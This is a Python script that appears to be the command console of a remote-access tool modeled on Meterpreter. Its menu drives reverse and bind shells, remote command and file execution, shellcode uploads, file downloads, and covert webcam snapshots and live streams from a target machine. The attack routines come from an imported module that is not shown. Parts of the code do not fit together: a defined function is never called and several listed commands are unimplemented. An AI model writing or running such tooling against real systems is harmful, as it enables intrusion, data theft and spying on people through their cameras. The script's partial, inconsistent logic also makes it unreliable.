#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pyfiglet import Figlet
from colorama import Fore, init
import threading
import requests
import time
import sys
import os
import base64
import time as t
import argparse
import platform
import getpass
import subprocess
import socket
import meterpreter
import meterpreter.commands
from meterpreter import bot, command
import meterpreter.rhosts
import meterpreter.rports
from meterpreter import execute_file, download_file, execute_command, get_process_list, shellcode2, shellcode3
import meterpreter.lhosts
import meterpreter.lports

def meterpreter_reverse(payload):
    try:
        meterpreter.check_rhosts()
    except:
        print("[intbase] please set rhosts from intconsole")
    try:
        meterpreter.check_rports()
    except:
        print("[intbase] please set rports from intconsole")
    try:
        meterpreter.check_lhosts()
    except:
        print("[intbase] please set lhosts from intconsole")
    try:
        meterpreter.check_lports()
    except:
        print("[intbase] please set lports from intconsole")

def __user__():
    while True:
        m_i = input("meterpreter> ").strip().lower()
        
        if m_i in ["help", "?"]:
            print("""
            Meterpreter                Function
            =========                ========
            ?                        print help
            help                     print commands
            rhost                    set rhosts
            rports                   set rports
            reverse                  connect for reverse_tcp
            bind                     connect for bind_tcp
            ps                       list running processes
            sysinfo                  displays general information about the target system
            shell                    starts an interactive shell on system
            upload                   uploads a local file to the target system
            route -n                 list network routes
            webcam_list              list cameras
            webcam_snap              takes a snapshot from target
            webcam_stream            starts a live video stream from the target's cameras
            background               puts the meterpreter session in the background
            """)
        elif m_i.startswith("shell"):
            if "-f" in m_i:
                file = m_i.split("-f")[-1].strip()
                execute_file(meterpreter.rhosts, meterpreter.rports, file)
            else:
                command = m_i.split(" ", 1)[-1].strip()
                execute_command(meterpreter.rhosts, meterpreter.rports, command)
        elif m_i in ["reverse", "reverse_tcp"]:
            bot.reverse(meterpreter.lhosts, meterpreter.lports)
        elif m_i in ["bind", "bind_tcp"]:
            bot.bind(meterpreter.rhosts, meterpreter.rports)
        elif m_i == "webcam_list":
            command.webcam_list()
        elif m_i == "webcam_snap":
            command.webcam_snap()
        elif m_i == "webcam_stream":
            command.webcam_stream()
        elif m_i.startswith("upload"):
            path_file = m_i.split(" ", 1)[-1].strip()
            if path_file == "shellcodes":
            	shellcode2()
            	shellcode3()
            else:
            	execute_file(meterpreter.rhosts, meterpreter.rports, path_file)
        elif m_i.startswith("download"):
            path_file = m_i.split(" ", 1)[-1].strip()
            download_file(meterpreter.rhosts, meterpreter.rports, path_file)
        elif m_i == "ls":
            execute_command(meterpreter.rhosts, meterpreter.rports, "ls")

if __name__ == "__main__":
    __user__()